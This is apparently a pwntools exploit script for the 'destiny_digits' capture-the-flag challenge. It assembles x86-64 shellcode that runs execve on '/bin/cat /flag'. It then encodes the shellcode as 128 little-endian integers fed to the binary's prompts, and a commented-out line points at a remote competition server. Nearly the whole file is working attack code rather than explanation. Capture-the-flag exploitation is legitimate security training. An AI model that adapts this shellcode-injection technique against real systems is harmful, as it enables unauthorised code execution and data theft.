#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template destiny_digits
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('destiny_digits')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *peek_at_destiny+180
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE en
flag = b'/bin/cat\x00/flag\x00'
io = start()
#io = remote('flu.xxx' ,10110)

shell=asm('lea rdi,[rsp]')
shell+=asm('movb [rdi],0x2f')
shell+=asm('nop')

for i in range(1,len(flag)):
    fl = flag[i:-(len(flag)-1-i)]
    fl = int.from_bytes(fl,byteorder='little')
    shell+=asm('movb [rdi+{0}],{1}'.format(hex(i),hex(fl)))
for i in range(8):
    shell+=asm('movb [rsi+{0}],0x0'.format(hex(0x10+i)))

shell+=asm('mov al,0x3b')
shell+=asm('nop')
shell+=asm('nop')

shell+=asm('fnop')
shell+=asm('syscall')

shell+=asm('lea rsi,[rdi+0x18]')

shell+=asm('nop')
shell+=asm('mov [rsi],rdi')

shell+=asm('lea r8,[rsi+0x8]')

shell+=asm('lea r9,[rdi+0x9]')

shell+=asm('nop')
shell+=asm('mov [r8],r9')

shell+=asm('mov al,0x3b')
shell+=asm('nop')
shell+=asm('nop')

shell+=b'\x90'*(129*4-len(shell))

for i in range(128):
    four = shell[4*i:-(128-i)*4]
    num = int.from_bytes(four,byteorder='little')
    io.sendlineafter(b'? ',str(num).encode())

io.interactive()
